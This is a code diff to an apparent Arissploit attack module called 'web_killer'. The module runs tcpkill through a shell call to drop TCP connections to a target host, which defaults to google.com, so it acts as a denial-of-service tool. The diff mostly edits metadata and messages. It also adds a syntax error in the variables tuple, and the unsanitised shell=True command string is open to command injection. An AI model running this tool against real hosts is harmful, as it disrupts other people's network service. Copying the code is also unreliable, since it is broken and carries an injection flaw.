@@ -1,5 +1,3 @@
-
-
 from core.arissploit import *
 import time
 import os
@@ -9,10 +7,8 @@ from core import colors
 conf = {
 	"name": "web_killer",
 	"version": "1.0",
-	"shortdesc": "TCP Attack",
-	"author": "entynetproject",
-	"github": "entynetproject",
-	"email":  "entynetproject0@gmail.com",
+	"shortdesc": "TCP attack.",
+	"author": "Entynetproject",
 	"initdate": "24.2.2016",
 	"lastmod": "29.12.2016",
 	"apisupport": False,
@@ -21,8 +17,8 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('interface', ['wlan0', 'network interface name']),
-	('target', ['google.com', 'target address']),
+	('interface', ['wlan0', 'Network interface name'.]),
+	('target', ['google.com', 'Target address.']),
 
 ))
 
@@ -38,7 +34,7 @@ def run():
 	time.sleep(2)
 	command_1 = 'tcpkill -i ' + variables['interface'][0] +' -9 host ' + variables['target'][0]
 	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	line_3 = colors.green + "attack has been started, for stop attack press [enter]"
+	line_3 = colors.green + "Attack has been started, to stop attack press [enter]"
 	press_ak = input(line_3)
 	os.system('killall tcpkill')
-	printInfo("attack has been stoped")
+	printInfo("Attack has been stoped.")
